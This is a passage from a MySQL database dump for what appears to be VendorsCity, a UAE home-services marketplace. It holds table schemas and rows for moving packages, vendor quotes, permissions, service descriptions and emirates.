(130, 34, '🔄 White Goods Connection'),
(131, 34, '🔧 Dismantling & Assembly'),
(132, 35, '🚛 4 | 3-Ton Closed Truck'),
(133, 35, '👥 12 | Helpers'),
(134, 35, '🛠️ 2 | Installers'),
(135, 35, '🔄 White Goods Connection'),
(136, 35, '🔧 Dismantling & Assembly'),
(137, 35, '📦 Boxes'),
(138, 36, '🚛 4 | 3-Ton Closed Truck'),
(139, 36, '👥 14 | Helpers'),
(140, 36, '🛠️ 2 | Installers'),
(141, 36, '🔄 White Goods Connection'),
(142, 36, '🔧 Dismantling & Assembly'),
(143, 36, '📦 Boxes'),
(144, 36, '🔨 Handyman'),
(145, 37, '🚛 3 | 3-Ton Closed Truck'),
(146, 37, '👥 8 | Helpers'),
(147, 37, '🔄 White Goods Connection'),
(148, 37, '🔧 Dismantling & Assembly'),
(149, 38, '🚛 3 | 3-Ton Closed Truck'),
(150, 38, '👥 9 | Helpers'),
(151, 38, '🛠️ 2 | Installers'),
(152, 38, '🔄 White Goods Connection'),
(153, 38, '🔧 Dismantling & Assembly'),
(154, 38, '📦 Boxes'),
(155, 39, '🚛 3 | 3-Ton Closed Truck'),
(156, 39, '👥 10 | Helpers'),
(157, 39, '🛠️ 2 | Installers'),
(158, 39, '🔄 White Goods Connection'),
(159, 39, '🔧 Dismantling & Assembly'),
(160, 39, '📦 Boxes'),
(161, 39, '🔨 Handyman'),
(162, 40, '🚛 4 | 3-Ton Closed Truck'),
(163, 40, '👥 10 | Helpers'),
(164, 40, '🔄 White Goods Connection'),
(165, 40, '🔧 Dismantling & Assembly'),
(166, 41, '🚛 4 | 3-Ton Closed Truck'),
(167, 41, '👥 12 | Helpers'),
(168, 41, '🛠️ 2 | Installers'),
(169, 41, '🔄 White Goods Connection'),
(170, 41, '🔧 Dismantling & Assembly'),
(171, 41, '📦 Boxes'),
(172, 42, '🚛 4 | 3-Ton Closed Truck'),
(173, 42, '👥 14 | Helpers'),
(174, 42, '🛠️ 2 | Installers'),
(175, 42, '🔄 White Goods Connection'),
(176, 42, '🔧 Dismantling & Assembly'),
(177, 42, '📦 Boxes'),
(178, 42, '🔨 Handyman'),
(179, 43, '🚛 5 | 3-Ton Closed Truck'),
(180, 43, '👥 13 | Helpers'),
(181, 43, '🔄 White Goods Connection'),
(182, 43, '🔧 Dismantling & Assembly'),
(183, 44, '🚛 5 | 3-Ton Closed Truck'),
(184, 44, '👥 15 | Helpers'),
(185, 44, '🛠️ 2 | Installers'),
(186, 44, '🔄 White Goods Connection'),
(187, 44, '🔧 Dismantling & Assembly'),
(188, 44, '📦 Boxes'),
(189, 45, '🚛 5 | 3-Ton Closed Truck'),
(190, 45, '👥 18 | Helpers'),
(191, 45, '🛠️ 2 | Installers'),
(192, 45, '🔄 White Goods Connection'),
(193, 45, '🔧 Dismantling & Assembly'),
(194, 45, '📦 Boxes'),
(195, 45, '🔨 Handyman'),
(196, 46, 'a');

-- --------------------------------------------------------

--
-- Table structure for table `packages_others`
--

CREATE TABLE `packages_others` (
  `id` int(11) NOT NULL,
  `pid` int(11) DEFAULT NULL,
  `others` varchar(255) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

--
-- Dumping data for table `packages_others`
--

INSERT INTO `packages_others` (`id`, `pid`, `others`) VALUES
(1, 38, '100% satisfaction guaranteed'),
(2, 38, 'Same day delivery'),
(3, 38, 'Trusted professionals');

-- --------------------------------------------------------

--
-- Table structure for table `package_attr`
--

CREATE TABLE `package_attr` (
  `id` int(11) NOT NULL,
  `title_addmore` varchar(255) DEFAULT NULL,
  `image` varchar(255) DEFAULT NULL,
  `description_addmore` text,
  `pid` int(11) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

--
-- Dumping data for table `package_attr`
--

INSERT INTO `package_attr` (`id`, `title_addmore`, `image`, `description_addmore`, `pid`) VALUES
(1, '', NULL, '', 49),
(2, 'aabbb', '1716533546-Screenshot-2024-05-23-at-12.22.55 AM.png', 'cccddd', 46),
(3, '', NULL, '', 46),
(4, '', NULL, '', 47),
(5, '', NULL, '', 48),
(6, '', NULL, '', 49),
(7, '', NULL, '', 50),
(8, '', NULL, '', 51),
(9, '', NULL, '', 52),
(10, '', NULL, '', 53),
(11, '', NULL, '', 54),
(12, '', NULL, '', 55);

-- --------------------------------------------------------

--
-- Table structure for table `package_categories`
--

CREATE TABLE `package_categories` (
  `id` int(11) NOT NULL,
  `service_id` varchar(255) NOT NULL,
  `subservice_id` varchar(255) NOT NULL,
  `name` varchar(255) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

--
-- Dumping data for table `package_categories`
--

INSERT INTO `package_categories` (`id`, `service_id`, `subservice_id`, `name`) VALUES
(14, '30', '27', 'Storage'),
(17, '30', '26', 'Villa Moving'),
(18, '30', '23', 'Apartment Moving'),
(20, '43', '60', 'Test-cate'),
(21, '45', '29', 'Apartment'),
(22, '45', '29', 'Villa');

-- --------------------------------------------------------

--
-- Table structure for table `package_inquiry_accepted`
--

CREATE TABLE `package_inquiry_accepted` (
  `id` int(11) NOT NULL,
  `packages_inquiry_id` int(11) NOT NULL,
  `vendor_id` int(11) NOT NULL,
  `added_date` date NOT NULL,
  `accept_reject` int(11) DEFAULT NULL COMMENT '0=accept,1=reject',
  `reject_reason` text NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

--
-- Dumping data for table `package_inquiry_accepted`
--

INSERT INTO `package_inquiry_accepted` (`id`, `packages_inquiry_id`, `vendor_id`, `added_date`, `accept_reject`, `reject_reason`) VALUES
(1, 46, 73, '2024-03-16', 0, ''),
(2, 69, 73, '2024-03-16', 0, ''),
(3, 129, 74, '2024-04-27', 0, ''),
(4, 143, 75, '2024-05-11', 0, ''),
(5, 155, 75, '2024-05-13', 0, ''),
(6, 155, 75, '2024-05-13', 0, ''),
(7, 155, 75, '2024-05-13', 0, ''),
(8, 156, 75, '2024-05-14', 0, ''),
(9, 140, 75, '2024-05-14', 0, ''),
(10, 157, 77, '2024-05-18', 0, ''),
(11, 158, 78, '2024-05-18', 0, ''),
(12, 159, 75, '2024-05-18', 0, ''),
(13, 160, 79, '2024-05-18', 0, ''),
(14, 159, 79, '2024-05-18', 1, 'I do not serve this city'),
(15, 194, 73, '2024-06-01', 0, ''),
(16, 196, 73, '2024-06-04', 0, ''),
(17, 197, 73, '2024-06-04', 0, ''),
(18, 199, 73, '2024-06-04', 0, ''),
(19, 193, 73, '2024-06-04', 0, ''),
(20, 201, 73, '2024-06-04', 0, ''),
(21, 202, 73, '2024-06-04', 0, ''),
(22, 183, 73, '2024-06-04', 1, 'I do not serve this city'),
(23, 203, 73, '2024-06-04', 0, ''),
(24, 204, 73, '2024-06-04', 0, ''),
(25, 206, 73, '2024-06-04', 0, ''),
(26, 207, 75, '2024-06-05', 0, ''),
(27, 198, 77, '2024-06-05', 0, ''),
(28, 213, 77, '2024-06-05', 0, ''),
(29, 214, 73, '2024-06-05', 0, ''),
(30, 205, 73, '2024-06-05', 0, ''),
(31, 205, 73, '2024-06-05', 0, ''),
(32, 205, 73, '2024-06-05', 0, ''),
(33, 205, 73, '2024-06-05', 0, ''),
(34, 113, 73, '2024-06-05', 0, ''),
(35, 217, 73, '2024-06-05', 0, ''),
(36, 218, 77, '2024-06-05', 0, ''),
(37, 226, 73, '2024-06-06', 0, ''),
(38, 233, 73, '2024-06-06', 0, ''),
(39, 235, 73, '2024-06-06', 0, '');

-- --------------------------------------------------------

--
-- Table structure for table `password_resets`
--

CREATE TABLE `password_resets` (
  `email` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `token` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- --------------------------------------------------------

--
-- Table structure for table `permissions`
--

CREATE TABLE `permissions` (
  `id` bigint(20) UNSIGNED NOT NULL,
  `pname` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `permissions`
--

INSERT INTO `permissions` (`id`, `pname`, `created_at`, `updated_at`) VALUES
(1, 'country', NULL, NULL),
(2, 'state', NULL, NULL),
(3, 'city', NULL, NULL),
(4, 'service', NULL, NULL),
(5, 'subservice', NULL, NULL),
(6, 'userpermission', NULL, NULL),
(7, 'adminuser', NULL, NULL),
(8, 'vendors', NULL, NULL),
(9, 'Prices', NULL, NULL),
(10, 'CMS', NULL, NULL),
(11, 'PackageCategory', NULL, NULL),
(12, 'Packages', NULL, NULL),
(13, 'Subscription', NULL, NULL),
(14, 'admin wallet', NULL, NULL),
(15, 'faq', '2023-11-28 08:47:13', '2023-11-28 08:47:13'),
(16, 'frontuser', '2023-11-28 08:47:13', '2023-11-28 08:47:13'),
(17, 'Packages Enquiry', '2023-11-28 08:47:13', '2023-11-28 08:47:13'),
(18, 'Form Fields', '2023-12-11 08:47:13', '2023-12-11 08:47:13'),
(19, 'Order', '2023-12-12 08:47:13', '2023-12-12 08:47:13'),
(20, 'Subscribe', '2023-12-12 08:47:13', '2023-12-12 08:47:13'),
(21, 'Blogs', NULL, NULL),
(22, 'sales report', NULL, NULL),
(23, 'Google Review', NULL, NULL),
(24, 'System', NULL, NULL),
(25, 'Blog Category', NULL, NULL);

-- --------------------------------------------------------

--
-- Table structure for table `personal_access_tokens`
--

CREATE TABLE `personal_access_tokens` (
  `id` bigint(20) UNSIGNED NOT NULL,
  `tokenable_type` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `tokenable_id` bigint(20) UNSIGNED NOT NULL,
  `name` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `token` varchar(64) COLLATE utf8mb4_unicode_ci NOT NULL,
  `abilities` text COLLATE utf8mb4_unicode_ci,
  `last_used_at` timestamp NULL DEFAULT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- --------------------------------------------------------

--
-- Table structure for table `prices`
--

CREATE TABLE `prices` (
  `id` int(11) NOT NULL,
  `based_on_booking_service_label` varchar(255) DEFAULT NULL,
  `based_on_booking_service_price` int(11) DEFAULT NULL,
  `set_order` int(11) DEFAULT NULL,
  `created_at` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP,
  `updated_at` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP,
  `based_on_listing_criteria_label` varchar(255) DEFAULT NULL,
  `based_on_listing_criteria_price` int(11) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

--
-- Dumping data for table `prices`
--

INSERT INTO `prices` (`id`, `based_on_booking_service_label`, `based_on_booking_service_price`, `set_order`, `created_at`, `updated_at`, `based_on_listing_criteria_label`, `based_on_listing_criteria_price`) VALUES
(1, NULL, NULL, 0, '2023-11-06 03:43:43', '2024-05-29 14:16:50', 'Based on Listing Criteria', 300);

-- --------------------------------------------------------

--
-- Table structure for table `qoute_includes`
--

CREATE TABLE `qoute_includes` (
  `id` int(11) NOT NULL,
  `accept_lead` varchar(255) DEFAULT NULL,
  `qoute` int(11) DEFAULT NULL,
  `package_inquiry_accepted_id` int(11) DEFAULT NULL,
  `packages_inquiry_id` int(11) DEFAULT NULL,
  `vendor_id` int(11) DEFAULT NULL,
  `qoute_includes_id` int(11) DEFAULT NULL,
  `qoute_include_value` varchar(255) DEFAULT NULL,
  `qoute_includes_name` varchar(255) DEFAULT NULL,
  `added_date` date DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

--
-- Dumping data for table `qoute_includes`
--

INSERT INTO `qoute_includes` (`id`, `accept_lead`, `qoute`, `package_inquiry_accepted_id`, `packages_inquiry_id`, `vendor_id`, `qoute_includes_id`, `qoute_include_value`, `qoute_includes_name`, `added_date`) VALUES
(1, 'Enter Qoute', 150, 16, 196, 73, 1, 'yes', 'Packaging Material', '2024-06-04'),
(2, 'Enter Qoute', 150, 16, 196, 73, 2, 'yes', 'Packing Service', '2024-06-04'),
(3, 'Enter Qoute', 150, 16, 196, 73, 3, 'no', 'Handyman', '2024-06-04'),
(4, 'Enter Qoute', 150, 17, 197, 73, 1, 'yes', 'Packaging Material', '2024-06-04'),
(5, 'Enter Qoute', 150, 17, 197, 73, 2, 'no', 'Packing Service', '2024-06-04'),
(6, 'Enter Qoute', 150, 17, 197, 73, 3, 'yes', 'Handyman', '2024-06-04'),
(7, 'Request Survey', NULL, 18, 199, 73, 1, 'yes', 'Packaging Material', '2024-06-04'),
(8, 'Request Survey', NULL, 18, 199, 73, 2, 'yes', 'Packing Service', '2024-06-04'),
(9, 'Request Survey', NULL, 18, 199, 73, 3, 'no', 'Handyman', '2024-06-04'),
(10, 'Request Survey', NULL, 19, 193, 73, 1, 'yes', 'Packaging Material', '2024-06-04'),
(11, 'Request Survey', NULL, 19, 193, 73, 2, 'yes', 'Packing Service', '2024-06-04'),
(12, 'Request Survey', NULL, 19, 193, 73, 3, 'yes', 'Handyman', '2024-06-04'),
(13, 'Request Survey', NULL, 20, 201, 73, 1, 'no', 'Packaging Material', '2024-06-04'),
(14, 'Request Survey', NULL, 20, 201, 73, 2, 'no', 'Packing Service', '2024-06-04'),
(15, 'Request Survey', NULL, 20, 201, 73, 3, 'no', 'Handyman', '2024-06-04'),
(16, 'Enter Qoute', 118, 21, 202, 73, 1, 'yes', 'Packaging Material', '2024-06-04'),
(17, 'Enter Qoute', 118, 21, 202, 73, 2, 'no', 'Packing Service', '2024-06-04'),
(18, 'Enter Qoute', 118, 21, 202, 73, 3, 'yes', 'Handyman', '2024-06-04'),
(19, 'Enter Qoute', 120, 23, 203, 73, 1, 'yes', 'Packaging Material', '2024-06-04'),
(20, 'Enter Qoute', 120, 23, 203, 73, 2, 'yes', 'Packing Service', '2024-06-04'),
(21, 'Enter Qoute', 120, 23, 203, 73, 3, 'no', 'Handyman', '2024-06-04'),
(22, 'Request Survey', NULL, 24, 204, 73, 1, 'no', 'Packaging Material', '2024-06-04'),
(23, 'Request Survey', NULL, 24, 204, 73, 2, 'no', 'Packing Service', '2024-06-04'),
(24, 'Request Survey', NULL, 24, 204, 73, 3, 'yes', 'Handyman', '2024-06-04'),
(25, 'Request Survey', NULL, 25, 206, 73, 4, 'anually', 'Rate', '2024-06-04'),
(26, 'Request Survey', NULL, 25, 206, 73, 5, 'yes', 'Packing Service', '2024-06-04'),
(27, 'Request Survey', NULL, 25, 206, 73, 6, 'yes', 'Packing Material', '2024-06-04'),
(28, 'Request Survey', NULL, 25, 206, 73, 7, 'yes', 'Pick up and Delivery', '2024-06-04'),
(29, 'Request Survey', NULL, 25, 206, 73, 8, 'no', 'Climate Control', '2024-06-04'),
(30, 'Request Survey', NULL, 25, 206, 73, 9, 'no', '24 Hour Access', '2024-06-04'),
(31, 'Request Survey', NULL, 26, 207, 75, 1, 'yes', 'Packaging Material', '2024-06-05'),
(32, 'Request Survey', NULL, 26, 207, 75, 2, 'yes', 'Packing Service', '2024-06-05'),
(33, 'Request Survey', NULL, 26, 207, 75, 3, 'no', 'Handyman', '2024-06-05'),
(34, 'Enter Qoute', 150, 27, 198, 77, 1, 'yes', 'Packaging Material', '2024-06-05'),
(35, 'Enter Qoute', 150, 27, 198, 77, 2, 'yes', 'Packing Service', '2024-06-05'),
(36, 'Enter Qoute', 150, 27, 198, 77, 3, 'yes', 'Handyman', '2024-06-05'),
(37, 'Enter Qoute', 151, 28, 213, 77, 1, 'no', 'Packaging Material', '2024-06-05'),
(38, 'Enter Qoute', 151, 28, 213, 77, 2, 'yes', 'Packing Service', '2024-06-05'),
(39, 'Enter Qoute', 151, 28, 213, 77, 3, 'no', 'Handyman', '2024-06-05'),
(40, 'Enter Qoute', 152, 29, 214, 73, 4, 'weekly', 'Rate', '2024-06-05'),
(41, 'Enter Qoute', 152, 29, 214, 73, 5, 'yes', 'Packing Service', '2024-06-05'),
(42, 'Enter Qoute', 152, 29, 214, 73, 6, 'yes', 'Packing Material', '2024-06-05'),
(43, 'Enter Qoute', 152, 29, 214, 73, 7, 'yes', 'Pick up and Delivery', '2024-06-05'),
(44, 'Enter Qoute', 152, 29, 214, 73, 8, 'yes', 'Climate Control', '2024-06-05'),
(45, 'Enter Qoute', 152, 29, 214, 73, 9, 'yes', '24 Hour Access', '2024-06-05'),
(64, 'Enter Qoute', 150, 33, 205, 73, 4, 'anually', 'Rate', '2024-06-05'),
(65, 'Enter Qoute', 150, 33, 205, 73, 5, 'yes', 'Packing Service', '2024-06-05'),
(66, 'Enter Qoute', 150, 33, 205, 73, 6, 'no', 'Packing Material', '2024-06-05'),
(67, 'Enter Qoute', 150, 33, 205, 73, 7, 'yes', 'Pick up and Delivery', '2024-06-05'),
(68, 'Enter Qoute', 150, 33, 205, 73, 8, 'no', 'Climate Control', '2024-06-05'),
(69, 'Enter Qoute', 150, 33, 205, 73, 9, 'yes', '24 Hour Access', '2024-06-05'),
(70, 'Enter Qoute', 150, 34, 113, 73, 4, 'monthly', 'Rate', '2024-06-05'),
(71, 'Enter Qoute', 150, 34, 113, 73, 5, 'no', 'Packing Service', '2024-06-05'),
(72, 'Enter Qoute', 150, 34, 113, 73, 6, 'no', 'Packing Material', '2024-06-05'),
(73, 'Enter Qoute', 150, 34, 113, 73, 7, 'no', 'Pick up and Delivery', '2024-06-05'),
(74, 'Enter Qoute', 150, 34, 113, 73, 8, 'no', 'Climate Control', '2024-06-05'),
(75, 'Enter Qoute', 150, 34, 113, 73, 9, 'no', '24 Hour Access', '2024-06-05'),
(76, 'Request Survey', NULL, 35, 217, 73, 1, 'no', 'Packaging Material', '2024-06-05'),
(77, 'Request Survey', NULL, 35, 217, 73, 2, 'no', 'Packing Service', '2024-06-05'),
(78, 'Request Survey', NULL, 35, 217, 73, 3, 'no', 'Handyman', '2024-06-05'),
(79, 'Enter Qoute', 150, 36, 218, 77, 1, 'no', 'Packaging Material', '2024-06-05'),
(80, 'Enter Qoute', 150, 36, 218, 77, 2, 'yes', 'Packing Service', '2024-06-05'),
(81, 'Enter Qoute', 150, 36, 218, 77, 3, 'no', 'Handyman', '2024-06-05'),
(82, 'Enter Qoute', 151, 37, 226, 73, 1, 'no', 'Packaging Material', '2024-06-06'),
(83, 'Enter Qoute', 151, 37, 226, 73, 2, 'no', 'Packing Service', '2024-06-06'),
(84, 'Enter Qoute', 151, 37, 226, 73, 3, 'no', 'Handyman', '2024-06-06'),
(85, 'Enter Qoute', 1510, 38, 233, 73, 1, 'yes', 'Packaging Material', '2024-06-06'),
(86, 'Enter Qoute', 1510, 38, 233, 73, 2, 'yes', 'Packing Service', '2024-06-06'),
(87, 'Enter Qoute', 1510, 38, 233, 73, 3, 'no', 'Handyman', '2024-06-06'),
(88, 'Enter Qoute', 1200, 39, 235, 73, 1, 'yes', 'Packaging Material', '2024-06-06'),
(89, 'Enter Qoute', 1200, 39, 235, 73, 2, 'yes', 'Packing Service', '2024-06-06'),
(90, 'Enter Qoute', 1200, 39, 235, 73, 3, 'yes', 'Handyman', '2024-06-06');

-- --------------------------------------------------------

--
-- Table structure for table `reject_enquiry`
--

CREATE TABLE `reject_enquiry` (
  `id` int(11) NOT NULL,
  `inquiry_id` int(11) NOT NULL,
  `vendor_id` int(11) NOT NULL,
  `reject_reason` text NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

--
-- Dumping data for table `reject_enquiry`
--

INSERT INTO `reject_enquiry` (`id`, `inquiry_id`, `vendor_id`, `reject_reason`) VALUES
(1, 1, 48, 'test');

-- --------------------------------------------------------

--
-- Table structure for table `services`
--

CREATE TABLE `services` (
  `id` bigint(20) UNSIGNED NOT NULL,
  `country` int(11) NOT NULL,
  `city` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `servicename` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `page_url` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `sort_description` text COLLATE utf8mb4_unicode_ci,
  `title1` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `title2` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `banner_url` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `image` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `title` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `sub_title` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `banner` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `is_active` int(11) NOT NULL DEFAULT '0',
  `banner_description` text COLLATE utf8mb4_unicode_ci,
  `set_order` int(11) DEFAULT NULL,
  `form_fields` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `form_fields_two` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `services`
--

INSERT INTO `services` (`id`, `country`, `city`, `servicename`, `page_url`, `sort_description`, `title1`, `title2`, `banner_url`, `image`, `title`, `sub_title`, `banner`, `is_active`, `banner_description`, `set_order`, `form_fields`, `form_fields_two`, `created_at`, `updated_at`) VALUES
(30, 22, NULL, 'Moving', 'moving', 'We understand that moving can be a daunting task, but with our expert team and comprehensive services, we make the process seamless and stress-free. As a premier moving and storage company in Dubai, we take pride in delivering top-notch services tailored to meet your unique needs.', 'Moving Experts', 'Experience Stress-Free Moving Services', 'https://www.vendorscity.com/service/moving', '1716790020Moving_Banner-removebg-preview.png', 'Explore the best deals on moving', 'Use Code MoveitMoveit', '1717144863Moving.png', 0, NULL, 1, '18,20,21,22,45,46', '21,22,30,45,46,47,48,63', '2024-02-15 10:53:16', '2024-06-19 05:22:09'),
(32, 22, NULL, 'Cleaning Services', 'cleaning-services', 'Transforming spaces into pristine havens, VendorsCity is a premier cleaning service provider offering a comprehensive range of cleaning services across the UAE. With a commitment to excellence and attention to detail, we elevate cleanliness to an art form, ensuring your home, office, and various spaces sparkle with freshness.', NULL, NULL, NULL, '1708926988Home-Cleaning-Companies-in-RAK-Cover-31-05.jpg', NULL, NULL, NULL, 1, NULL, 10, '32', '', '2024-02-26 00:26:28', '2024-03-27 07:36:21'),
(33, 22, NULL, 'AC Services', 'ac-services', 'At VendorsCity, we prioritize customer satisfaction, efficiency, and reliability. Our dedicated team of professionals is committed to delivering top-tier AC services, ensuring your indoor spaces remain cool, comfortable, and energy-efficient.', NULL, NULL, NULL, '1708931741AC-service-inbig-2.png', NULL, NULL, NULL, 1, NULL, 4, NULL, '', '2024-02-26 01:45:41', '2024-02-26 11:31:27'),
(34, 22, NULL, 'Handyman & Maintainence', 'handyman-maintainence', 'We pride ourselves on reliability, professionalism, and customer satisfaction. Our dedicated team is equipped to handle a diverse range of projects, delivering quality craftsmanship and ensuring your spaces remain well-maintained.', NULL, NULL, NULL, '1708931949handyman-services.jpg', NULL, NULL, NULL, 1, NULL, 12, NULL, '', '2024-02-26 01:49:09', '2024-02-26 11:31:21'),
(35, 22, NULL, 'Media  Services', 'media-services', 'We combine creativity, technology, and professionalism to deliver media solutions that surpass expectations. Whether you\'re a business looking to enhance your brand presence or an individual seeking to capture special moments, we tailor our services to meet your unique needs.', NULL, NULL, NULL, '1708932092photography-services-london-shoot.jpg', NULL, NULL, NULL, 1, NULL, 11, NULL, '', '2024-02-26 01:51:32', '2024-02-26 11:31:11'),
(36, 22, NULL, 'Health & Fitness', 'health-fitness', 'We believe in the transformative power of a healthy lifestyle. Our dedicated team of health and fitness professionals is committed to guiding you towards a happier, healthier version of yourself. Embrace vitality with our tailored services.', NULL, NULL, NULL, '1708932216health-magazines.jpg', NULL, NULL, NULL, 1, NULL, 9, NULL, '', '2024-02-26 01:53:36', '2024-02-26 11:30:57'),
(37, 22, NULL, 'PRO Services', 'pro-services', 'We understand the vital role of efficient PRO services in the success of your business in the UAE. Our dedicated team of experts is committed to providing reliable, timely, and personalized solutions to meet your specific needs. C', NULL, NULL, NULL, '1708932353pro-services-dubai.jpg', NULL, NULL, NULL, 1, NULL, 10, NULL, '', '2024-02-26 01:55:53', '2024-02-26 11:30:50'),
(38, 22, NULL, 'Automotive Services', 'automotive-services', 'Revolutionize your automotive experience with VendorsCity, your premier destination for a comprehensive array of top-notch automotive services in the UAE. From safeguarding your car during vacations to expert repairs, maintenance, tinting, PPF (Paint Protection Film), and beyond, we are committed to elevating your driving experience.', NULL, NULL, NULL, '1708932638automotive-success-story.jpg', NULL, NULL, NULL, 1, NULL, 5, NULL, '', '2024-02-26 02:00:38', '2024-02-26 11:30:37'),
(39, 22, NULL, 'Pest Control Services', 'pest-control-services', 'We understand the importance of a pest-free environment for your well-being and peace of mind. Our team of skilled professionals employs advanced techniques and eco-friendly treatments to address pest issues effectively.', NULL, NULL, NULL, '1708933141pest-Control-.webp', NULL, NULL, NULL, 1, NULL, 6, NULL, '', '2024-02-26 02:09:01', '2024-02-26 11:30:12'),
(40, 22, NULL, 'Gardening Services', 'gardening-services', 'Step into a world of greenery and tranquility with VendorsCity, your premier provider of comprehensive gardening services in the UAE. With a passion for horticulture and a commitment to excellence, we transform outdoor spaces into vibrant, lush landscapes that elevate the beauty of homes and businesses.', NULL, NULL, NULL, '1708933292trusted_local_gardeners_gardening_service.webp.1200x630_q85_crop-smart-2.jpg', NULL, NULL, NULL, 1, NULL, 7, NULL, '', '2024-02-26 02:11:32', '2024-02-26 02:11:32'),
(41, 22, NULL, 'Insurance Services', 'insurance-services', NULL, NULL, NULL, NULL, '1709192523Screenshot-2024-02-29-at-11.41.41 AM.png', NULL, NULL, NULL, 1, NULL, 8, '17,18,19,20,21,22,24', '17,18,19,20,21,22,24,32', '2024-02-29 02:12:03', '2024-03-13 06:02:26'),
(44, 22, NULL, 'Storage', 'storage', 'Storage solutions for your goods has never been simpler. Bypass the challenging task of scouring through numerous vendors – at VendorsCity, we streamline the process. Easily receive 5 free quotes from reputable vendors specializing in various storage needs, whether it\'s personal storage, commercial storage, or self-storage.', 'Storage Experts', NULL, 'https://vendorscity.com/service/storage', '1716632954Storage---Big-banner-min.png', 'Explore the best deals on storage', 'Use Code StroageitStorageit', '1717144959Storage-Category-Page-min-min.png', 0, NULL, 2, '25,26,27,28,29,31,32', '', '2024-03-27 07:13:30', '2024-05-31 03:16:36'),
(45, 22, NULL, 'Cleaning', 'cleaning', NULL, 'Cleaning Experts', NULL, NULL, '1717664067Cleaning-Banner-min.png', 'Explore the best deals on cleaning', 'Use Code CleanitCleanit', '1717145172Cleaning-Category-Page-min-min.png', 0, NULL, 3, NULL, '', '2024-03-27 07:40:10', '2024-06-06 03:24:27'),
(46, 22, '20', 'Mobile Repairing', 'mobile-repairing', 'Lorem ipsum dolor sit amet, consectetur adipiscing elit. Sed eu nulla velit. Morbi lorem lorem, volutpat quis turpis a, pulvinar feugiat dui. Vivamus elementum eu orci ut molestie.', 'Title 1', 'Title 2', NULL, '17170043151_F7sTt3Ee5gEdLyyhHdZZRg.jpg', NULL, NULL, NULL, 1, NULL, 0, NULL, '', '2024-05-29 12:08:35', '2024-05-29 12:08:35');

-- --------------------------------------------------------

--
-- Table structure for table `service_quote_includes`
--

CREATE TABLE `service_quote_includes` (
  `id` int(11) NOT NULL,
  `service_id` int(11) NOT NULL,
  `name` varchar(255) COLLATE utf8_unicode_ci NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;

--
-- Dumping data for table `service_quote_includes`
--

INSERT INTO `service_quote_includes` (`id`, `service_id`, `name`) VALUES
(1, 30, 'Packaging Material'),
(2, 30, 'Packing Service'),
(3, 30, 'Handyman'),
(4, 44, 'Rate'),
(5, 44, 'Packing Service'),
(6, 44, 'Packing Material\n'),
(7, 44, 'Pick up and Delivery'),
(8, 44, 'Climate Control'),
(9, 44, '24 Hour Access\n');

-- --------------------------------------------------------

--
-- Table structure for table `states`
--

CREATE TABLE `states` (
  `id` bigint(20) UNSIGNED NOT NULL,
  `country_id` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `state` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `states`
--

INSERT INTO `states` (`id`, `country_id`, `state`, `created_at`, `updated_at`) VALUES
(23, '22', 'Dubai', '2024-02-15 10:50:30', '2024-02-15 10:50:30'),
(25, '22', 'Abu Dhabi', '2024-03-05 09:56:09', '2024-03-05 09:56:09'),
(26, '22', 'Sharjah', '2024-05-29 12:09:19', '2024-05-29 12:09:19'),
(27, '22', 'Ajman', '2024-05-29 12:09:29', '2024-05-29 12:09:29'),
(28, '22', 'Umm Al Quwain', '2024-05-29 12:09:48', '2024-05-29 12:09:48'),
(29, '22', 'Ras Al Khaimah', '2024-05-29 12:10:03', '2024-05-29 12:10:03'),
(30, '22', 'Fujairah', '2024-05-29 12:10:30', '2024-05-29 12:10:30');

-- --------------------------------------------------------

--
-- Table structure for table `subscribes`
--

CREATE TABLE `subscribes` (
  `id` int(11) NOT NULL,
